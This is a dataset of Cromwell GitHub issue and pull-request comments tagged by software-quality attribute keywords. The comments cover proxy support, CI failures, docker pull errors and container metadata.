https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1545803504:219,Modifiability,config,configuration,219,"After discussing internally, we unfortunately can't add this code or support the general direction of proxy compatibility. Docker lookups and call caching are pretty sensitive and involved and we're looking to keep the configuration surface area to an absolute minimum.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1545803504
https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1547154827:110,Deployability,configurat,configuration,110,"Hearing that the Cromwell team will reject this (and then hence the original PR) is pretty disappointing. The configuration option is specific, doesn't explicitly relate to proxies, but allows us to run Cromwell, despite the lack of proxy support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1547154827
https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1547154827:110,Modifiability,config,configuration,110,"Hearing that the Cromwell team will reject this (and then hence the original PR) is pretty disappointing. The configuration option is specific, doesn't explicitly relate to proxies, but allows us to run Cromwell, despite the lack of proxy support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1547154827
https://github.com/broadinstitute/cromwell/pull/7116#issuecomment-1508504416:0,Testability,Test,Tested,0,Tested in dev!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7116#issuecomment-1508504416
https://github.com/broadinstitute/cromwell/pull/7123#issuecomment-1529854583:46,Integrability,depend,dependency,46,"Some of the ci builds are still failing bc of dependency conflicts, fixing that up now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7123#issuecomment-1529854583
https://github.com/broadinstitute/cromwell/pull/7126#issuecomment-1533061988:16,Testability,test,test,16,"The one failing test here is the one this PR attempts to fix. Given that the PR that introduced this change in the first place didn't have the long-running test, I'm wondering if CI is taking some state from `develop`. This is a good change anyway, so merging and seeing whether this fixes other branches.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7126#issuecomment-1533061988
https://github.com/broadinstitute/cromwell/pull/7126#issuecomment-1533061988:156,Testability,test,test,156,"The one failing test here is the one this PR attempts to fix. Given that the PR that introduced this change in the first place didn't have the long-running test, I'm wondering if CI is taking some state from `develop`. This is a good change anyway, so merging and seeing whether this fixes other branches.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7126#issuecomment-1533061988
https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307:69,Deployability,integrat,integration,69,"This change seems to be causing deadlocks or timeouts or ??? in some integration tests, looking into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307
https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307:69,Integrability,integrat,integration,69,"This change seems to be causing deadlocks or timeouts or ??? in some integration tests, looking into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307
https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307:45,Safety,timeout,timeouts,45,"This change seems to be causing deadlocks or timeouts or ??? in some integration tests, looking into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307
https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307:81,Testability,test,tests,81,"This change seems to be causing deadlocks or timeouts or ??? in some integration tests, looking into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307
https://github.com/broadinstitute/cromwell/pull/7129#issuecomment-1638937420:49,Testability,test,test,49,"I have a new PR whose changeset passes my ""sniff test"" as far as irrelevant changes are concerned. We might want to work off of that one going forward https://github.com/broadinstitute/cromwell/pull/7177. Also, I know everyone has their own git workflows, but based on my experiences I would ask that we merge `develop` into this branch instead of rebasing going forward.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7129#issuecomment-1638937420
https://github.com/broadinstitute/cromwell/pull/7130#issuecomment-1540843190:41,Availability,failure,failures,41,"This is ready for review, remaining test failures are being handled in other PRs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7130#issuecomment-1540843190
https://github.com/broadinstitute/cromwell/pull/7130#issuecomment-1540843190:36,Testability,test,test,36,"This is ready for review, remaining test failures are being handled in other PRs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7130#issuecomment-1540843190
https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333:125,Deployability,update,updated,125,"> That issue is already fixed in docker-py 6.1.0. Thanks for pointing this out. It looks like `docker-py` is no longer being updated in PyPl/pip, but `docker` is. `pip` was installing an outdated version because of that. I updated our test to use `docker` instead. This update involved an API change, which I also updated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333
https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333:173,Deployability,install,installing,173,"> That issue is already fixed in docker-py 6.1.0. Thanks for pointing this out. It looks like `docker-py` is no longer being updated in PyPl/pip, but `docker` is. `pip` was installing an outdated version because of that. I updated our test to use `docker` instead. This update involved an API change, which I also updated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333
https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333:223,Deployability,update,updated,223,"> That issue is already fixed in docker-py 6.1.0. Thanks for pointing this out. It looks like `docker-py` is no longer being updated in PyPl/pip, but `docker` is. `pip` was installing an outdated version because of that. I updated our test to use `docker` instead. This update involved an API change, which I also updated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333
https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333:270,Deployability,update,update,270,"> That issue is already fixed in docker-py 6.1.0. Thanks for pointing this out. It looks like `docker-py` is no longer being updated in PyPl/pip, but `docker` is. `pip` was installing an outdated version because of that. I updated our test to use `docker` instead. This update involved an API change, which I also updated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333
https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333:314,Deployability,update,updated,314,"> That issue is already fixed in docker-py 6.1.0. Thanks for pointing this out. It looks like `docker-py` is no longer being updated in PyPl/pip, but `docker` is. `pip` was installing an outdated version because of that. I updated our test to use `docker` instead. This update involved an API change, which I also updated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333
https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333:235,Testability,test,test,235,"> That issue is already fixed in docker-py 6.1.0. Thanks for pointing this out. It looks like `docker-py` is no longer being updated in PyPl/pip, but `docker` is. `pip` was installing an outdated version because of that. I updated our test to use `docker` instead. This update involved an API change, which I also updated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545949117:158,Availability,error,error,158,"Cromwell doesn't control how the worker VM responds to 403s, that is internal to PAPI. At most, it can retry the whole task (pipeline) if it classifies `PAPI error code 7` as a retryable failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545949117
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545949117:187,Availability,failure,failure,187,"Cromwell doesn't control how the worker VM responds to 403s, that is internal to PAPI. At most, it can retry the whole task (pipeline) if it classifies `PAPI error code 7` as a retryable failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545949117
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545949117:125,Deployability,pipeline,pipeline,125,"Cromwell doesn't control how the worker VM responds to 403s, that is internal to PAPI. At most, it can retry the whole task (pipeline) if it classifies `PAPI error code 7` as a retryable failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545949117
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545961059:176,Availability,error,error,176,"I see, so is the VM tasked through PAPI to pull the docker and then run `gcs_localization.sh` and `script`? Is it the internal PAPI code that failed to properly handle the 403 error when pulling the docker?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1545961059
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:89,Availability,error,errors,89,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:184,Availability,failure,failures,184,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:325,Availability,avail,available,325,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:472,Deployability,pipeline,pipelines,472,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:528,Deployability,pipeline,pipelines,528,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:545,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,545,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:157,Safety,detect,detect,157,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:136,Testability,log,logic,136,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1732101263:91,Availability,error,errors,91,"> Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. For the ""docker pull failed during a very large scatter"" case, retries are pretty much always successful (except when the image actually doesn't exist of course). Would it be reasonable for this to be handled, especially since this isn't a rare failure when scattering more than 300x?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1732101263
https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1732101263:372,Availability,failure,failure,372,"> Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. For the ""docker pull failed during a very large scatter"" case, retries are pretty much always successful (except when the image actually doesn't exist of course). Would it be reasonable for this to be handled, especially since this isn't a rare failure when scattering more than 300x?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1732101263
https://github.com/broadinstitute/cromwell/pull/7133#issuecomment-1540253229:328,Deployability,patch,patch,328,"NOTE: While I need to describe these WDLs using our Cromwell instance, there is a CROM-4572 ticket already created that was previously closed, and [this comment](https://broadworkbench.atlassian.net/browse/CROM-4648?focusedCommentId=17048) mentions eliminating zip imports. While that's being figured out, I'm contributing this patch JIC someone else wants to cherry-pick this for their instance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7133#issuecomment-1540253229
https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978:54,Availability,error,error,54,"> What actually gets printed here, do we see a useful error from the underlying HTTP request? (I've made this mistake before...). So we're wrapping the response with a layer of IO, so this was what I was able to come up with to ensure the response information was piped to the log, but let me know if you think there is a better way. I verified locally with the ubuntu example that we get the 404 not found status, as well as the more informational MANIFEST_UNKNOWN body, so I hope thats enough to capture what we're seeing with Quay",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978
https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978:139,Integrability,wrap,wrapping,139,"> What actually gets printed here, do we see a useful error from the underlying HTTP request? (I've made this mistake before...). So we're wrapping the response with a layer of IO, so this was what I was able to come up with to ensure the response information was piped to the log, but let me know if you think there is a better way. I verified locally with the ubuntu example that we get the 404 not found status, as well as the more informational MANIFEST_UNKNOWN body, so I hope thats enough to capture what we're seeing with Quay",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978
https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978:277,Testability,log,log,277,"> What actually gets printed here, do we see a useful error from the underlying HTTP request? (I've made this mistake before...). So we're wrapping the response with a layer of IO, so this was what I was able to come up with to ensure the response information was piped to the log, but let me know if you think there is a better way. I verified locally with the ubuntu example that we get the 404 not found status, as well as the more informational MANIFEST_UNKNOWN body, so I hope thats enough to capture what we're seeing with Quay",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978
https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814:176,Availability,error,error,176,"The HTTP library we use [0] does not support proxies [1], therefore it is not possible for Cromwell to support them either without a whole-library replacement. The certificate error is normal and a red herring, it occurs because certs apply to domain names and not IP addresses. I can reproduce it locally with no proxy. [0] https://github.com/broadinstitute/cromwell/blob/17efd599d541a096dc5704991daeaefdd794fefd/project/Dependencies.scala#L166; [1] https://github.com/http4s/blaze/issues/656",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814
https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814:422,Integrability,Depend,Dependencies,422,"The HTTP library we use [0] does not support proxies [1], therefore it is not possible for Cromwell to support them either without a whole-library replacement. The certificate error is normal and a red herring, it occurs because certs apply to domain names and not IP addresses. I can reproduce it locally with no proxy. [0] https://github.com/broadinstitute/cromwell/blob/17efd599d541a096dc5704991daeaefdd794fefd/project/Dependencies.scala#L166; [1] https://github.com/http4s/blaze/issues/656",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814
https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814:164,Security,certificate,certificate,164,"The HTTP library we use [0] does not support proxies [1], therefore it is not possible for Cromwell to support them either without a whole-library replacement. The certificate error is normal and a red herring, it occurs because certs apply to domain names and not IP addresses. I can reproduce it locally with no proxy. [0] https://github.com/broadinstitute/cromwell/blob/17efd599d541a096dc5704991daeaefdd794fefd/project/Dependencies.scala#L166; [1] https://github.com/http4s/blaze/issues/656",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:302,Deployability,pipeline,pipelines,302,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:358,Deployability,pipeline,pipelines,358,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:521,Deployability,pipeline,pipelines,521,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:577,Deployability,pipeline,pipelines,577,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:130,Energy Efficiency,monitor,monitoring,130,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:379,Energy Efficiency,Monitor,MonitoringAction,379,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:594,Energy Efficiency,monitor,monitoring,594,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:758,Energy Efficiency,monitor,monitoring,758,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851
